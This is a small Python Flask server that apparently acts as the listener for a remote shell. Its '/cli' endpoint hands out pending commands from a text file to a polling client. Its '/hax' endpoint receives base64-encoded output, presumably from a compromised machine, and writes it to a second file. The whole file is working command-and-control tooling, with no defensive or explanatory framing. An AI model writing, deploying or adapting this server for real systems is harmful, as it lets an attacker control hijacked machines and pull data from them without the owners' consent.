from flask import Flask, request
import base64
import urllib.parse

app = Flask(__name__)

@app.route("/")
def GET_hello():
    with open('shell.txt', 'w') as ifile:
        ifile.write('')
    return 'hello'

@app.route("/cli")
def GET_cmd():
    with open('shell.txt', 'r') as ifile:
        message = ifile.read()
    return message

@app.route("/hax")
def waiting():
    data = request.args.get('data', '')
    data = urllib.parse.unquote(data)
    with open('shell.txt', 'w') as ifile:
        ifile.write('')
    with open('shell2.txt', 'w') as ofile:
        try:
            decoded_output = base64.b64decode(data).decode('utf-8')
            ofile.write(decoded_output)
        except Exception as e:
            ofile.write('Error decoding data: ' + str(e))
    return ''

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
